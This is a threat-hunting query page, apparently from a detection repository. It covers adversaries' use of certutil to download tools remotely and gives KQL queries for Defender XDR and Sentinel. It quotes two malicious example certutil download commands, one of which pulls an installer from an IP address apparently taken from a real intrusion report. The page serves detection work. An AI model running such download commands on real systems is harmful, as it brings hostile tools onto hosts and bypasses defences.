# Certutil Remote Download

## Query Information

#### MITRE ATT&CK Technique(s)

| Technique ID | Title    | Link    |
| ---  | --- | --- |
| T1218 | System Binary Proxy Execution | https://attack.mitre.org/techniques/T1218/ |

#### MITRE ATT&CK Technique(s)

| Technique ID | Title    | Link    |
| ---  | --- | --- |
| T1105| Ingress Tool Transfer | https://attack.mitre.org/techniques/T1105/ |

#### Description
Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols. The living of the land binary certutil is know to be misused by adversaries to remotely collect malicious tools.

Malicious Examples (Sources, see references):
```PowerShell
certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
certutil  -urlcache -f http[:]//23.26.137[.]225:8084/msappdata.msi c:\mpyutd.msi
```

#### Risk
An adversary transfered tools to the local device for execution.

#### References
- https://lolbas-project.github.io/lolbas/Binaries/Certutil/
- https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708

## Defender XDR
```KQL
DeviceProcessEvents
| where FileName == "certutil.exe"
| where tolower(ProcessCommandLine) has_all ("http", "urlcache", "-f")
| project-reorder Timestamp, ProcessCommandLine, FileName, InitiatingProcessAccountUpn
```
## Sentinel
```KQL
DeviceProcessEvents
| where FileName == "certutil.exe"
| where tolower(ProcessCommandLine) has_all ("http", "urlcache", "-f")
| project-reorder TimeGenerated, ProcessCommandLine, FileName, InitiatingProcessAccountUpn
```
